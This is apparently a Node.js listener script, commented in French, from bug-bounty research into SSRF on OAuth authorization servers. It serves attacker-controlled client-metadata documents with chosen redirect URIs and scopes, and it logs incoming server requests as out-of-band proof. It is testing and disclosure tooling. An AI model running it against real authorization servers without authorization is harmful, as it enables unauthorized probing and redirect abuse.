const http = require("http");
const fs = require("fs");
const PORT = 8099;
const LOG = "/tmp/opencode/ssrf-listener.log";
const logLine = (l) => { console.log(l); try { fs.appendFileSync(LOG, l + "\n"); } catch {} };

// Listener d'ecoute : sert un document de metadata client construit a partir de la query string,
// et journalise chaque requete recue (UA + IP source) -> preuve OOB sans service tiers.
const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://" + req.headers.host);
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "?").toString().split(",")[0].trim();
  const ua = req.headers["user-agent"] || "-";
  logLine(`${new Date().toISOString()} | ${req.method} ${u.pathname}${u.search} | ip=${ip} | ua=${ua}`);

  if (u.pathname.startsWith("/doc/")) {
    const host = (req.headers.host || "").replace(/:\d+$/, "");
    const proto = String(req.headers.host || "").includes("lhr.life") ? "https" : (req.socket.encrypted ? "https" : "http");
    const cid = `${proto}://${host}${u.pathname}${u.search}`;
    const doc = {
      client_id: cid,
      client_name: u.searchParams.get("name") || "bb-cimd-research (document de test)",
      redirect_uris: [u.searchParams.get("redirect") || `${proto}://${host}/cb`],
      grant_types: ["authorization_code", "refresh_token"],
      response_types: ["code"],
      token_endpoint_auth_method: "none",
      scope: u.searchParams.get("scope") || "programs:read profile:read reports:read reports:write",
    };
    const body = JSON.stringify(doc);
    res.writeHead(200, { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) });
    res.end(body);
    return;
  }
  if (u.pathname === "/log") {
    let lines = "";
    try { lines = fs.readFileSync(LOG, "utf8"); } catch {}
    const rows = lines.trim().split("\n").filter(Boolean).reverse();
    const html = `<!doctype html><meta charset="utf-8"><title>Journal de reception</title>
<style>body{font:13px/1.6 ui-monospace,monospace;background:#0b0d10;color:#d6e0ea;padding:24px}
h1{font-size:16px;color:#7fd1ff;margin:0 0 4px}p{color:#8fa3b8;margin:0 0 16px}
table{border-collapse:collapse;width:100%}td{border-bottom:1px solid #1d2530;padding:6px 10px;vertical-align:top}
td.i{color:#ffd479;white-space:nowrap}td.u{color:#9ef07a}td.p{color:#8fa3b8}b{color:#fff}</style>
<h1>Journal de reception - requetes emanant du serveur d'autorisation</h1>
<p>${rows.length} requete(s) recue(s) | chaque ligne = une requete sortante emise par le serveur d'autorisation</p>
<table>${rows.map((r) => { const p = r.split(" | "); return `<tr><td class="i">${p[0] || ""}</td><td class="p">${(p[1] || "").slice(0, 80)}</td><td class="i">${p[2 || 1] || ""}</td><td class="u">${p[3] || ""}</td></tr>`; }).join("")}</table>`;
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(html);
    return;
  }
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("ok\n");
});
server.listen(PORT, "0.0.0.0", () => logLine(`[listener] en ecoute sur http://0.0.0.0:${PORT}`));
